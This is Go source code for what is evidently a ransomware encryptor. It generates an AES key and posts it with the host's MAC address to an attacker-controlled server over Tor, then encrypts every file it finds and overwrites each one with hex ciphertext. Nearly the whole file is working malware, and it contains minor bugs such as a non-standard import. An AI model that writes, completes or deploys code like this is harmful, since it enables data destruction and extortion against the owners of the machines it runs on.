package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fileutils"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"time"

	"github.com/cretz/bine/tor"
	"github.com/gen2brain/go-libtor"
	"github.com/joho/godotenv"
)

// Encrypt main function
func main() {
	bytes := make([]byte, 32)
	if _, err := rand.Read(bytes); err != nil {
		panic(err.Error())
	}

	key := hex.EncodeToString(bytes)
	// We have to send the key to the server
	sendKeyToServer(key)

	for _, file := range fileutils.GetAllFiles() {
		plaintext, err := ioutil.ReadFile(file)
		if err != nil {
			panic(err.Error())
		}

		block, err := aes.NewCipher(bytes)
		if err != nil {
			panic(err.Error())
		}

		aesGCM, err := cipher.NewGCM(block)
		if err != nil {
			panic(err.Error())
		}

		nonce := make([]byte, aesGCM.NonceSize())
		if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
			panic(err.Error())
		}

		ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)

		err2 := ioutil.WriteFile(file, []byte(hex.EncodeToString(ciphertext)), 0644)

		if err2 != nil {
			panic(err.Error())
		}
	}

}

func sendKeyToServer(key string) error {
	t, err := tor.Start(context.TODO(), &tor.StartConf{ProcessCreator: libtor.Creator})
	if err != nil {
		return err
	}
	defer t.Close()
	// Wait at most a minute to start network and get
	dialCtx, dialCancel := context.WithTimeout(context.Background(), time.Minute)
	defer dialCancel()
	// Make connection
	dialer, err := t.Dialer(dialCtx, nil)
	if err != nil {
		return err
	}
	httpClient := &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}

	// change the url to your ip address and port
	godotenv.Load("../.env")
	address := os.Getenv("ADDRESS")

	URL := "http://" + address

	resp, err := httpClient.PostForm(URL, url.Values{"key": {key}, "mac": {getMacAddr()}})

	if err != nil {
		panic(err.Error())
	}

	defer resp.Body.Close()

	return err
}

func getMacAddr() string {
	ifas, err := net.Interfaces()
	if err != nil || len(ifas) == 0 {
		return "ff:ff:ff:ff:ff:ff:ff"
	}
	for _, ifa := range ifas {
		a := ifa.HardwareAddr.String()
		if a != "" {
			return a
		}
	}
	return "ff:ff:ff:ff:ff:ff:ff"
}
